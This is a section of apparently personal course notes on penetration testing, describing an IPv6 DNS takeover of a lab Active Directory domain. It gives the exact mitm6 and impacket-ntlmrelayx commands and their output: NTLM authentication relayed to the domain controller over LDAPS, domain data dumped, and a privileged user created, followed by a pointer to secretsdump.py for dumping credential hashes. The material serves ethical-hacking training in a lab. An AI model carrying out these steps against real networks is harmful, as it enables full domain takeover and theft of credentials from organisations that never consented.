# IX. IPv6 Attack (DNS Takeover via mitm6).

First, make sure `mitm6` is installed on the Kali machine machine. If not, this [repo](https://github.com/dirkjanm/mitm6) contains the necessary  steps to do so. 

Next open two tabs on the terminal. In the first tab, type the following command, `sudo mitm6 -d <DOMAIN NAME>`. Do not run it just yet.

In the second tab, setup `ntlmrelayx` with `impacket-ntlmrelayx -6 -t ldaps<DOMAIN CONTROLLER IP> -wh fakewpad.DOMAIN NAME -l TheLoot`. 

```bash
┌──(kali㉿kali)-[~]
└─$ sudo impacket-ntlmrelayx -6 -t ldaps://10.0.2.8 -wh fakewapd.ONEPIECE.local -l TheLoot
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

```

Hit `ENTER`. 

Once it’s running, go back to the first tab and run `mitm6`

```bash
──(kali㉿kali)-[~]
└─$ sudo mitm6 -d ONEPIECE.local
[sudo] password for kali: 
Starting mitm6 using the following configuration:
Primary adapter: eth0 [08:00:27:22:46:4f]
IPv4 address: 10.0.2.4
IPv6 address: fe80::8c0:237:c947:808
DNS local search domain: ONEPIECE.local
DNS allowlist: onepiece.local
IPv6 address fe80::2115:1 is now assigned to mac=08:00:27:87:4e:2a host=STRAWHATS-PC.ONEPIECE.local. ipv4=
IPv6 address fe80::2115:2 is now assigned to mac=08:00:27:00:29:f5 host=FRANKY.ONEPIECE.local. ipv4
```

So, what’s happening here is whenever an event (reboot, logging in etc) occurs on the network, this will allow an attacker to take that event and relay it via `ntlmrelayx` and then to the domain controller. 

Now make sure all windows machines (User and Domain Controller) are on. Restart a user machine and go back to the Kali terminal.

NOTE: `mitm6` should only be used in short bursts when carrying out this attack or it might lead to authentication issues and network outages.

Eventually, a bunch of stuff will start succeeding. This is a good sign. 

```bash
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Serving PAC file to client ::ffff:10.0.2.11
[*] HTTPD(80): Connection from ::ffff:10.0.2.11 controlled, attacking target ldaps://10.0.2.8
[*] HTTPD(80): Authenticating against ldaps://10.0.2.8 as ONEPIECE/FRANKY$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

Checking the base folder and a `TheLoot` folder should appear. This folder contains all kinds of information such as all computers in the domain, users, groups etc.

![Loot](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/dba6f9f0-cca0-434a-908b-d9e9525b6321)

Next , login into the domain controller account on a windows user machine.

Go back to the `ntlmrelayx` tab:

![mitm6_new_user](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/123b071b-d4d1-4412-831f-f0b2b48ca2b5)

The tool has created a new user which can be used to access the domain controller account with elevated privileges. Pretty cool.

We can verify this by logging into our domain controller and checking the `Users` folder in `Active Directory Users and Computers`.

![mitm6_new_user_1](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/211ea1fa-526b-4657-9756-06f908b2212e)

Finally, we can run `secretsdump.py` to completely dump all the secrets of the Domain Controller, get the hashes and completely compromise it. This is pretty much game over.
